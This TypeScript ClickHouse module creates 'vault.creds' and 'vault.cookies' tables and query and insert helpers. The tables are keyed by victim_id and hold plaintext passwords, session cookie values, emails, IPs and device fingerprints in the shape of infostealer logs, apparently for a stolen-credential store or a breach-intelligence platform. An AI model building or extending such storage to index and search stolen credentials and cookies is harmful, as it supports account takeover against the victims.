import { createClient } from '@clickhouse/client'

// Build ClickHouse URL from environment variables
const buildClickHouseUrl = () => {
  // Check if we have a complete URL in environment
  if (process.env.CLICKHOUSE_URL) {
    return process.env.CLICKHOUSE_URL
  }
  
  // Build URL from individual components
  const host = process.env.CLICKHOUSE_HOST || 'localhost'
  const port = process.env.CLICKHOUSE_PORT || '8123'
  const protocol = process.env.CLICKHOUSE_PROTOCOL || (port === '8443' ? 'https' : 'http')
  
  return `${protocol}://${host}:${port}`
}

const clickhouseUrl = buildClickHouseUrl()

// Create ClickHouse client
const client = createClient({
  url: clickhouseUrl,
  username: process.env.CLICKHOUSE_USER || 'default',
  password: process.env.CLICKHOUSE_PASSWORD || '',
  database: process.env.CLICKHOUSE_DATABASE || 'vault',
  clickhouse_settings: {
    // Optimize for fast queries
    max_execution_time: 30,
    max_memory_usage: 10000000000, // 10GB
    use_uncompressed_cache: 1,
  },
  request_timeout: 30000,
})

export default client

// Helper function to check if ClickHouse is connected
export async function checkConnection() {
  try {
    console.log('Attempting to connect to ClickHouse...')
    console.log('URL:', clickhouseUrl)
    console.log('Database:', process.env.CLICKHOUSE_DATABASE || 'vault')
    console.log('Username:', process.env.CLICKHOUSE_USER || 'default')
    
    const result = await client.query({
      query: 'SELECT version()',
      format: 'JSONEachRow'
    })
    
    const data = await result.json() as any[]
    console.log('ClickHouse connected successfully')
    console.log('Version:', data[0]?.['version()'] || 'Unknown')
    return true
  } catch (error) {
    console.error('ClickHouse connection failed:')
    console.error('Host:', process.env.CLICKHOUSE_HOST || 'localhost')
    console.error('Port:', process.env.CLICKHOUSE_PORT || '8123')
    console.error('Protocol:', process.env.CLICKHOUSE_PROTOCOL || 'http')
    console.error('Built URL:', clickhouseUrl)
    console.error('Error:', error instanceof Error ? error.message : String(error))
    if (error instanceof Error && error.stack) {
      console.error('Stack trace:', error.stack)
    }
    console.error('Make sure ClickHouse is running and accessible')
    return false
  }
}

// Helper function to ensure database and table exist
export async function ensureSchema() {
  try {
    // Create database if it doesn't exist
    await client.command({
      query: 'CREATE DATABASE IF NOT EXISTS vault'
    })
    
    // Create the creds table with the user's provided schema
    await client.command({
      query: `
        CREATE TABLE IF NOT EXISTS vault.creds
        (
            ts                DateTime        DEFAULT now(),
            victim_id         String,
            source_name       String,
            url               String,
            domain            LowCardinality(String),
            email             String,
            username          String,
            password          Nullable(String),
            phone             Nullable(String),
            name              Nullable(String),
            address           Nullable(String),
            country           Nullable(String),
            origin            Nullable(String),
            fields            Array(String),
            hostname          Nullable(String),
            ip_address        String,
            language          Nullable(String),
            timezone          Nullable(String),
            os_version        Nullable(String),
            hwid              Nullable(String),
            cpu_name          Nullable(String),
            gpu               Nullable(String),
            ram_size          Nullable(String),
            account_type      LowCardinality(String),
            risk_score        UInt8,
            risk_category     LowCardinality(String),
            is_privileged     Bool,
            breach_impact     LowCardinality(String),

            INDEX bf_email   email    TYPE tokenbf_v1(1024, 3, 0)  GRANULARITY 64,
            INDEX bf_user    username TYPE tokenbf_v1(1024, 3, 0)  GRANULARITY 64,
            INDEX set_domain domain   TYPE set(8192)         GRANULARITY 64,
            INDEX bf_ip      ip_address TYPE tokenbf_v1(1024, 3, 0) GRANULARITY 64
        )
        ENGINE = ReplacingMergeTree(ts)
        ORDER BY (domain, email, username, victim_id)
        SETTINGS index_granularity = 8192
      `
    })

    // Create the cookies table with the user's provided schema
    await client.command({
      query: `
        CREATE TABLE IF NOT EXISTS vault.cookies
        (
            ts                    DateTime        DEFAULT now(),
            victim_id             String,
            domain                LowCardinality(String),
            cookie_name           String,
            cookie_path           String,
            cookie_value          Nullable(String),
            cookie_value_length   UInt32,
            secure                Bool,
            cookie_type           LowCardinality(String),
            risk_level            LowCardinality(String),
            browser_source        LowCardinality(String),
            hostname              Nullable(String),
            ip_address            Nullable(String),
            country               Nullable(String),

            INDEX bf_domain      domain      TYPE tokenbf_v1(1024, 3, 0)  GRANULARITY 64,
            INDEX bf_cookie_name cookie_name TYPE tokenbf_v1(1024, 3, 0)  GRANULARITY 64,
            INDEX set_cookie_type cookie_type TYPE set(8192)         GRANULARITY 64
        )
        ENGINE = ReplacingMergeTree(ts)
        ORDER BY (domain, cookie_name, victim_id, ts)
        SETTINGS index_granularity = 8192
      `
    })
    
    console.log('ClickHouse schema ensured successfully')
  } catch (error) {
    console.error('Error ensuring ClickHouse schema:', error)
    throw error
  }
}

// Helper function to execute queries with error handling
export async function executeQuery(query: string, format: 'JSONEachRow' | 'JSON' = 'JSONEachRow') {
  try {
    const result = await client.query({
      query,
      format
    })
    return await result.json()
  } catch (error) {
    console.error(`Error executing ClickHouse query: ${query}`)
    console.error('Error:', error)
    throw error
  }
}

// Helper function for insert operations
export async function insertData(tableName: string, data: any[]) {
  try {
    if (data.length === 0) return { success: true, count: 0 }
    
    await client.insert({
      table: tableName,
      values: data,
      format: 'JSONEachRow' as const
    })
    
    return { success: true, count: data.length }
  } catch (error) {
    console.error(`Error inserting data into ${tableName}:`, error)
    return { success: false, error: error instanceof Error ? error.message : String(error) }
  }
}
